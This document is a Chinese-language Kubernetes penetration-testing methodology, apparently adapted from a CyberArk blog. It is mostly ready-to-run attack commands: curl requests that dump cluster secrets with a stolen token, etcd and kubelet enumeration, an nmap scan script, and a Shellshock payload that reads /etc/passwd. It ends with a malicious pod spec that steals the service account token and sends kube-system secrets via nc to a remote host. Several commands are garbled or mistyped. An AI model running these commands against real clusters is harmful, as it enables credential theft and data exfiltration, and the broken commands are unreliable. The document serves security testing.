
随着生活节奏的加快，我们等待或休息的时间越来越少。Kubernetes 为我们的技术生活提供了类似的东西。它是一个容器编排平台，提供了一种简单、自动化的方式来建立和管理容器化应用程序网络。
随着 Kubernetes 系统在我们的“技术生活”中变得越来越普遍，我预计我们会越来越多地遇到这个系统。作为渗透测试人员和研究人员，我们的责任是照顾 Kubernetes 的安全方面。我们需要确保它的部署安全，并且不存在使整个系统面临风险的漏洞。
本系列旨在帮助安全人员了解 Kubernetes 系统中可能存在的风险。此外，它可以作为针对 Kubernetes 系统的渗透测试人员的优秀方法论文档，无论他们从事白盒、黑盒还是灰盒测试。这三种类型的测试之间的区别只是在任务开始时授予渗透测试人员的知识量和访问权限。

1、获得集群中列表秘密的访问权限的攻击者可以使用以下curl命令来获取“kube-system”命名空间中的所有秘密：
curl -v -H “Authorization: Bearer <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/

2、测试容器内的服务帐户令牌
Curl -H Bearer -H "Authorization: Bearer <JWT_TOKEN>" -H "Content-Type: application/json" --insecure https://<master_ip>:6443/api/v1/namespaces/default/secrets

3、获取解码的密钥
curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r '.items[].data'

4、检查Kubelet（只读端口）信息暴露情况
当“kubelet”只读端口暴露时，攻击者可以从 API 检索信息。这会公开集群配置元素，例如 Pod 名称、内部文件的位置和其他配置。这不是关键信息，但仍然不应该暴露在互联网上。
http://<外部IP>:10255/pods

检查服务帐号API授权
有时帐户名称并不能告诉我们太多信息。在这些情况下，我们应该尝试将请求发送到不同的 API 端点。
以下是您应该检查的一些有风险的 API 端点：

列出 Pod：
curl -v -H“授权：承载 <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/default/pods/

列出秘密：
curl -v -H“授权：承载 <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/default/secrets/

列出部署：
curl -v -H“授权：承载 <jwt_token>” https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments

列出守护进程：
url -v -H “授权：承载 <jwt_token>” https://<master_ip:<端口>/apis/extensions/v1beta1/namespaces/default/daemonsets

5、检查ETCD匿名访问
您可以将“ETCD”组件视为 Kubernetes 集群的数据库。ETCD 存储集群机密、配置文件和更敏感的数据。我们肯定会想要攻击这个关键组件。
默认情况下，ETCD 无法匿名访问，但检查一下总是好的。
如果ETCD可以匿名访问，您可能需要使用etcdctl工具。以下命令将获取存储的所有密钥：
etc1tool -endpoints=http://IP:2379 get / -prefix -keys-only

6、扫描是渗透测试人员找出网络中实际运行的服务的基本方法之一。然而，kubernetes 网络可能非常大，需要很长时间才能扫描。
以下 Bash 脚本（取自Kubernetes 研讨会）将安装并扫描 Kubernetes 集群的 IP 范围：
sudo apt-get update
sudo apt-get install nmap
nmap-kube () 
{ 
nmap --open -T4 -A -v -Pn -p 443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}
nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover

7、搜索存在漏洞的网络服务
服务是一种 Kubernetes 资源，充当客户端与其目的地之间的代理。每个服务都有自己的 IP 地址。Kubernetes 服务的优势之一是 Pod 和容器化应用程序的可用性。这是因为 Kubernetes 服务被配置为将请求转发到一组 pod。因此，实际上，我们应该扫描一个服务网络，以便了解集群中正在运行哪些应用程序。
在灰盒笔测试中，我们应该拥有对 API 的完全访问权限。在这些情况下，我们可以使用“kubectl”来查找集群中存在的所有服务，只需使用以下命令：
kubectl get svc –all-namespaces

扫描结果
所以，它是一个 HTTP 服务。我们应该通过使用“curl”发送 GET 请求来找出存储了哪些信息。经过一些研究，我们发现了以下端点：
curl http://10.10.66.223:9090/service-discovery

搜索存在漏洞的应用程序
在 Kubernetes 网络内搜索易受攻击的应用程序和服务是另一个重要的攻击媒介。我们都知道运行易受攻击的应用程序的风险以及在内部网络中找到它们的可能性更大。

在灰盒渗透测试中，您应该找到集群中运行的所有服务并一一检查它们。然而，在黑盒渗透测试中，找到服务可能会更困难，但网络扫描可以帮助解决这一问题。

我们想向您展示“Shellshock”(CVE-2014-6271)作为易受攻击的应用程序的示例。它存在一个远程执行代码漏洞，可以通过发送精心设计的 HTTP 请求标头来利用该漏洞。

因此，我们首先需要检测其易受攻击的应用程序。我们可以使用 Nmap NSE 脚本来为我们完成这项工作：

通过 shellshock 妥协

Useful commands for finding open ports:
用于查找开放端口的有用命令：

command nmap -Pn -T4 -F --open <host-ip>
# scanning every port, more is open
nmap -Pn -T4 --open <host-ip> -p 0-65535
nmap -Pn -T4 --open <host-ip> -p 30081
Check shellshock 检查 shellshock
curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "cat /etc/passwd"'
现在，我们可以使用以下CURL命令来读取存在漏洞的服务器的“etc/passwd”：

8、kubectl 获取角色系统：控制器：
bootstrap-signer -n kube-system -o yaml

9、列出密钥的角色
kubectl get secrets -o yaml  --context=

10、使用“-o yaml”获取密钥示例
kubectl get secret -o -json --context=mycontext |jq -r '.tems[1].data.password' | base64 -d
kubectl get secret -o -json --context=mycontext |jq -r '.tems[1].data.username' | base64 -d

11、权限修改Pod exec 是 kubernetes 中的一个选项，用于在 shell 环境中运行命令。此权限适用于想要访问容器并运行命令的管理员。这就像为容器创建 SSH 会话一样，我们需要使用以下命令：
kubectl exec -it <POD NAME> -n <POD’S NAMESPACE> –- sh

12、运行恶意YAML
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.14.28:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.14.28 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true

kubectl apply -f malicious-pod.yaml

参考链接：https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
